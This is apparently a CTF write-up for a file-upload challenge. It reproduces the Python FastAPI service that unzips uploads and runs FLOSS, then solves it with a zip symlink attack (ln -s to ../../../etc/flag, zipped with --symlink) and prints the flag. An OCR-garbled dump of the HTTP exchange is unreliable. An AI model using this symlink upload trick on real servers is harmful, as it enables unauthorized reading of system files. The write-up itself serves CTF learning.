# ðŸŽ“Throw your malware here!
> FLOSS is the superior "strings", so I've decided to run it as a SAAS! Enough with the obfuscated code that the pigeon keeps throwing at me!

> In fact, I decided to handle all types of files, even non-PE files and password-protected zip files!

> Flag is located at `/etc/flag`

## About the Challenge
We were given a source code called `app.py` (You can download the file [here](dist_throw-your-malware-here_0140c3bcedfeee2909f426086fbab6fa4c777229.zip)) and here is the content of the file

```python
from typing import Optional
import zipfile
import random
import shutil
import string
import subprocess
from pathlib import Path

import pefile
from fastapi import FastAPI, HTTPException, UploadFile
from fastapi.responses import JSONResponse


FILE_CACHE = Path("/app/cache")
FLOSS_PATH = Path("/usr/local/bin/floss")

app = FastAPI()


def get_random_string(length: int = 16) -> str:
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    return "".join(random.choice(letters) for _ in range(length))


@app.on_event("startup")
def startup():
    # Ensure caches exist
    if not FILE_CACHE.is_dir():
        FILE_CACHE.mkdir()


def run_floss(target: Path) -> str:
    args = [str(target), "--json"]
    try:
        pefile.PE(name=str(target))
    except pefile.PEFormatError:
        args.extend(("--only", "static"))
    output = subprocess.check_output((FLOSS_PATH, *args))
    return output.decode()


@app.post("/floss")
def floss_endpoint(sample: UploadFile, password: Optional[str]) -> JSONResponse:
    random_path = get_random_string()
    while (target_path := FILE_CACHE / random_path).exists():
        random_path = get_random_string()
    with target_path.open("wb+") as f:
        shutil.copyfileobj(sample.file, f)
    is_zipfile = zipfile.is_zipfile(target_path)
    if is_zipfile:
        with zipfile.ZipFile(target_path) as f:
            # No zip bombs!
            file_size_sum = sum(data.file_size for data in f.filelist)
            compressed_size_sum = sum(data.compress_size for data in f.filelist)
            if (file_size_sum / compressed_size_sum > 10):
                raise HTTPException(413, "Zip Bomb Detected")

            zipobjects = f.infolist()
            if any(zipobject.file_size > 50000 for zipobject in zipobjects):
                raise HTTPException(418, "I'm a teapot!")
            files = f.namelist()
        args = ["unzip"]
        if password:
            args.extend(("-P", password))
        args.extend((str(target_path), "-d", f"{FILE_CACHE / random_path}-zip"))
        a = subprocess.run(args)
        if a.returncode != 0:
            raise HTTPException(422, "Invalid password!")
        targets = [FILE_CACHE / f"{random_path}-zip" / file for file in files]
    else:
        targets = [target_path]
    results = [run_floss(target) for target in targets]
    return JSONResponse(
        {target.name: result for target, result in zip(targets, results)}
        if is_zipfile
        else results[0]
    )
```

The program accepts a file upload via the /floss endpoint and analyzes the uploaded file using FLOSS. It first saves the uploaded file to a cache directory. If the uploaded file is a ZIP archive, it checks for zip bomb and teapot conditions to prevent malicious or large files from being processed.

If the file is a ZIP archive, it extracts its contents to a separate directory in the cache. Otherwise, it directly analyzes the uploaded file. For each file (or extracted file in the case of a ZIP archive), it runs the run_floss() function, which invokes FLOSS to perform the analysis. The output is returned as a JSON response.

## How to Solve?
To solve this chall, im using this [website](https://infosecwriteups.com/zippy-challenge-writeup-cyberhack-ctf-80eb1d422249) as a reference. We can read the content of `/etc/flag` by using `zipslip` vulnerability. Here is the command I used

```
ln -s ../../../etc/flag awikwok.link
zip -P password --symlink awikwok.zip awikwok.link
```

And then upload to the website to obtain the flag


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
/floss?password-passuord HTTP/1.1
HTTP/1.1
200
Host
haluare
ueb
seet f
sg: 1337
dace:
Hon
Ju
2023
01:20:14
GIT
User-Agent
Hozilla/ 5
(Vindous
IT
10.0;
Vin64;
*64;
17:109
Serter
uicorn
Gecko/ZOlOO1ol
Firefor/114
content-
encth:
1104
Aecept
Cont
ent
type
applicat
on/json
ext /htpl
application/ xhtultxul
application/xnl
9=0.9 _
image/ avif_
inage/uebp
Lccept
Language-
en
US
en ;
zelda
link:
Accept
Enco
ding:
szip
deflace
analysis
enable_decoded_strings
false
enable
Content
Type
multipart
forn-data;
ack
scrings
false
enable_static_
strings
crue
enable
boundary
-44734808435805382171891629571
cight_scrings
false
ftnct
on5
analyzed
decoded_ser
Upgr ade
Insecure
Requests:
ings
analyzed
stacl_strings
analyzed
tight
SCri
Content
Lengch:
454
ngs
decoding
funct
on
scores
discoveredl
library
0} } ,
metadata
file_path
/ app / cache/ sb
44734806435805382171891629571
iqeuykusgouqae-zip/zelda
link-
imagebase
hin_lengeh
Content
Disposit_
on:
forn-data;
nae
sanple
filenane
rut ine
decoded_scrings
find
features
zelda
zip
0.0 ,
scack
strings
scart
date
"2023-06-12T01
Content
Type
applicat
on / *-z1p-compressed
20:15
6094472
scatic
strings
0009
ght_
strings
0.0 ,
Cotal
0009
"titisect
0 . 0}
"version
"32
15
PI
0-0 =
9783dd8â‚¬
strings
decoded_strings
16
BIV
ack
scrings
stacic_strings
[ {
encoding
ASCIIT
zelda_
lin-UT
rOdrOduxIuJ ( 9CO# _Oupdro:k_toaSph
'"offset
string
"Here
che
flag!  "} ,
encodin
DPFPK
ASCIIT
offset
17 ,
string
SEE ( 1
just
Janced
19
BIV
be lind
and
LLT
floss
veb
man}
encoding
20 Yizelda-linkUT OduxPKPq
SCII: "
"offset
75 ,
string'
1 "PIGEON POG! "}], 1 "cight
44734806435805382171891629571-
strings
[J } } n"
9-0
4-0
api]


```
SEE{i_just_wanted_to_be_kind_and_run_a_floss_web_api_man}
```